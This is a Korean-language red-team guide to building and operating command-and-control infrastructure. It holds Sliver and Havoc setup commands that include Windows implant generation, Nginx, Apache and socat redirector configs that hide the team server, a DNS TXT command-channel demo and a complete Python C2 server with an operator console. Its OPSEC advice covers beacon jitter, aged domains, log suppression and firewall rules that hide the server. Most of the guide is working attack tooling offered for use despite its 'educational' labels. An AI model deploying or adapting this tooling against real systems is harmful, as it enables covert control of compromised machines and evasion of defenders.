# C2(Command and Control) 인프라 구축 및 운영

## 개요

C2(C&C) 인프라는 레드팀 작전에서 에이전트(임플란트)를 제어하는 핵심 구성요소다. 탐지를 피하면서 안정적인 통신 채널을 유지하는 것이 핵심 과제다.

---

## C2 아키텍처 구성요소

```
레드팀 운영자
     │
     ▼
[팀서버 / C2 서버]  ← 실제 C2 로직 처리
     │
     ▼
[리다이렉터/프록시]  ← IP 숨김, 트래픽 필터링
     │
  인터넷
     │
     ▼
[에이전트/임플란트]  ← 침해된 시스템에서 실행
```

### 구성요소 역할

| 컴포넌트 | 역할 | 예시 |
|----------|------|------|
| 팀서버 | C2 명령 처리, 에이전트 관리 | Cobalt Strike, Havoc, Sliver |
| 리다이렉터 | 팀서버 IP 보호, 트래픽 포워딩 | Nginx, socat, Apache mod_rewrite |
| 에이전트 | 피해 시스템에서 실행, 비콘 | Beacon, Implant, RAT |
| CDN | 합법적 인프라 경유로 탐지 우회 | Cloudflare, AWS CloudFront |

---

## 오픈소스 C2 프레임워크

### Havoc Framework

```bash
# 서버 설치
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Docker로 실행
docker-compose up -d

# 팀서버 시작
./havoc server --profile ./profiles/havoc.yaotl -v --debug

# 클라이언트 접속
./havoc client
```

### Sliver Framework

```bash
# 설치
curl https://sliver.sh/install | sudo bash

# 서버 시작
sliver-server

# 리스너 생성 (HTTP/HTTPS/DNS/MTLS)
sliver > https --lhost 0.0.0.0 --lport 443

# 임플란트 생성
sliver > generate --http https://C2_DOMAIN --os windows --arch amd64 \
  --save /tmp/implant.exe

# 세션 관리
sliver > sessions
sliver > use SESSION_ID
sliver [session] > whoami
sliver [session] > ps
sliver [session] > upload /local/file /remote/path
```

---

## 리다이렉터 구성

### Nginx 리다이렉터

```nginx
# /etc/nginx/sites-available/c2_redirector

server {
    listen 443 ssl;
    server_name legitimate-looking-domain.com;

    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    # 특정 User-Agent/URI만 팀서버로 포워딩
    # 나머지는 합법적인 사이트로 리다이렉트
    location /api/v2/telemetry {
        # C2 비콘 경로 - 팀서버로 포워딩
        proxy_pass https://TEAMSERVER_IP:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location / {
        # 나머지 트래픽은 합법적 사이트로 리다이렉트
        return 302 https://www.microsoft.com/;
    }
}
```

### Apache mod_rewrite 리다이렉터

```apache
# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /etc/ssl/cert.pem
    SSLCertificateKeyFile /etc/ssl/key.pem

    RewriteEngine On

    # 에이전트 User-Agent만 포워딩
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*Windows NT 10.0.*rv:91.0"
    RewriteRule ^(.*)$ https://TEAMSERVER_IP:8443/$1 [P,L]

    # 나머지는 404
    RewriteRule ^(.*)$ - [F]
</VirtualHost>
```

### socat 간단 포워딩

```bash
# TCP 리다이렉터
socat TCP4-LISTEN:80,fork TCP4:TEAMSERVER_IP:80 &

# TLS 리다이렉터
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork \
  TCP4:TEAMSERVER_IP:8443 &
```

---

## 도메인 프론팅 개념

```
에이전트 → HTTPS → CDN (신뢰받는 도메인) → 팀서버
              Host: cdn.cloudflare.com     (SNI)
              Host: c2.attacker.com        (HTTP Host 헤더)
```

현재 대부분의 CDN이 차단했으나, 개념은 중요하다.

---

## DNS over HTTPS(DoH) C2

```python
#!/usr/bin/env python3
"""
DNS C2 개념 데모 - DNS TXT 레코드를 통한 명령 전달
(교육 목적)
"""

import base64
import dns.resolver


def send_command_via_dns(command: str, domain: str) -> None:
    encoded = base64.b64encode(command.encode()).decode()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    print(f"DNS TXT 레코드로 전송할 청크: {len(chunks)}개")
    for i, chunk in enumerate(chunks):
        print(f"  {i}.{domain} → TXT: {chunk}")


def receive_command_via_dns(domain: str) -> str | None:
    try:
        resolver = dns.resolver.Resolver()
        answers = resolver.resolve(domain, "TXT")
        combined = "".join(
            rdata.strings[0].decode()
            for rdata in answers
        )
        return base64.b64decode(combined).decode()
    except Exception:
        return None
```

---

## Python 미니 C2 서버 구현

```python
#!/usr/bin/env python3
"""
Mini C2 Server - HTTP 기반 에이전트 제어 (교육/연구 목적)
사용법: python3 mini_c2.py --host 0.0.0.0 --port 8080
"""

import argparse
import base64
import hashlib
import http.server
import json
import os
import queue
import sys
import threading
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs


@dataclass
class Agent:
    agent_id: str
    hostname: str
    username: str
    os_info: str
    last_seen: float = field(default_factory=time.time)
    command_queue: queue.Queue = field(default_factory=queue.Queue)
    results: list[dict] = field(default_factory=list)


# 전역 에이전트 저장소
agents: dict[str, Agent] = {}
agents_lock = threading.Lock()

# 간단한 API 키 (실전에서는 더 강력한 인증 필요)
API_KEY = hashlib.sha256(os.urandom(32)).hexdigest()[:32]


class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format: str, *args) -> None:
        pass  # 기본 로그 비활성화

    def _send_json(self, data: dict, status: int = 200) -> None:
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self) -> dict | None:
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length == 0:
            return None
        body = self.rfile.read(content_length)
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            return None

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/register":
            self._handle_register()
        elif path == "/beacon":
            self._handle_beacon()
        elif path == "/result":
            self._handle_result()
        elif path == "/cmd":
            self._handle_cmd()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_register(self) -> None:
        data = self._read_json()
        if not data:
            self._send_json({"error": "invalid"}, 400)
            return

        agent_id = hashlib.md5(
            (data.get("hostname", "") + data.get("username", "")).encode()
        ).hexdigest()[:8]

        with agents_lock:
            agent = Agent(
                agent_id=agent_id,
                hostname=data.get("hostname", "unknown"),
                username=data.get("username", "unknown"),
                os_info=data.get("os", "unknown"),
            )
            agents[agent_id] = agent

        print(f"[+] 새 에이전트 등록: {agent_id} ({agent.username}@{agent.hostname})")
        self._send_json({"agent_id": agent_id})

    def _handle_beacon(self) -> None:
        data = self._read_json()
        if not data:
            self._send_json({})
            return

        agent_id = data.get("agent_id", "")
        with agents_lock:
            agent = agents.get(agent_id)
            if not agent:
                self._send_json({"error": "unknown"}, 401)
                return

            agent.last_seen = time.time()

            try:
                command = agent.command_queue.get_nowait()
                self._send_json({"command": command})
                print(f"[→] {agent_id}: 명령 전달 — {command[:50]}")
            except queue.Empty:
                self._send_json({})

    def _handle_result(self) -> None:
        data = self._read_json()
        if not data:
            self._send_json({})
            return

        agent_id = data.get("agent_id", "")
        result = data.get("result", "")

        with agents_lock:
            agent = agents.get(agent_id)
            if agent:
                decoded = base64.b64decode(result).decode(errors="replace")
                agent.results.append({"time": time.time(), "output": decoded})
                print(f"[←] {agent_id}: 결과 수신 ({len(decoded)} bytes)")
                print(f"    {decoded[:200]}")

        self._send_json({"status": "ok"})

    def _handle_cmd(self) -> None:
        # 운영자 인터페이스 (실전에서는 인증 필수)
        data = self._read_json()
        if not data:
            self._send_json({"error": "invalid"}, 400)
            return

        if data.get("api_key") != API_KEY:
            self._send_json({"error": "unauthorized"}, 401)
            return

        agent_id = data.get("agent_id")
        command = data.get("command")

        with agents_lock:
            agent = agents.get(agent_id)
            if not agent:
                self._send_json({"error": "agent not found"}, 404)
                return

            agent.command_queue.put(command)

        self._send_json({"status": "queued"})


def operator_cli(server_url: str) -> None:
    import urllib.request
    print(f"[*] C2 운영자 CLI 시작 (API Key: {API_KEY})")
    print("[*] 명령어: list | cmd <id> <command> | quit")

    while True:
        try:
            line = input("C2> ").strip()
            if not line:
                continue
            if line == "quit":
                break
            elif line == "list":
                with agents_lock:
                    for aid, agent in agents.items():
                        age = int(time.time() - agent.last_seen)
                        print(f"  [{aid}] {agent.username}@{agent.hostname} ({age}s ago)")
            elif line.startswith("cmd "):
                parts = line.split(" ", 2)
                if len(parts) < 3:
                    print("사용법: cmd <agent_id> <command>")
                    continue
                _, agent_id, command = parts
                payload = json.dumps({
                    "api_key": API_KEY,
                    "agent_id": agent_id,
                    "command": command,
                }).encode()
                req = urllib.request.Request(
                    f"{server_url}/cmd",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                with urllib.request.urlopen(req) as resp:
                    print(json.loads(resp.read()))
        except (KeyboardInterrupt, EOFError):
            break


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Mini C2 Server (교육/연구 목적)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--host", default="0.0.0.0", help="바인딩 호스트")
    parser.add_argument("--port", type=int, default=8080, help="포트")

    args = parser.parse_args()

    server = http.server.ThreadingHTTPServer((args.host, args.port), C2Handler)
    print(f"[*] C2 서버 시작: http://{args.host}:{args.port}")
    print(f"[*] API Key: {API_KEY}")

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    operator_cli(f"http://127.0.0.1:{args.port}")
    server.shutdown()


if __name__ == "__main__":
    main()
```

---

## OPSEC 고려사항

### 인프라 격리

```
- 공격팀 실제 IP → 절대 노출 금지
- 각 작전마다 독립적인 도메인/IP 사용
- 도메인 에이징: 최소 30일 이상 된 도메인 사용
- 합법적 카테고리로 도메인 분류(IT, 기술 관련)
```

### 트래픽 위장

```
- 비콘 간격에 지터(jitter) 추가 (고정 패턴 탐지 방지)
- HTTPS 사용, 합법적 서비스 트래픽과 유사한 User-Agent
- 전송 크기 패딩
- 업무 시간에만 통신 (9-18시)
```

### 로그 최소화

```bash
# nginx 로그 비활성화
access_log off;
error_log /dev/null crit;

# iptables로 C2 서버 직접 접근 차단
iptables -A INPUT -p tcp --dport 8443 \
  ! -s REDIRECTOR_IP -j DROP
```
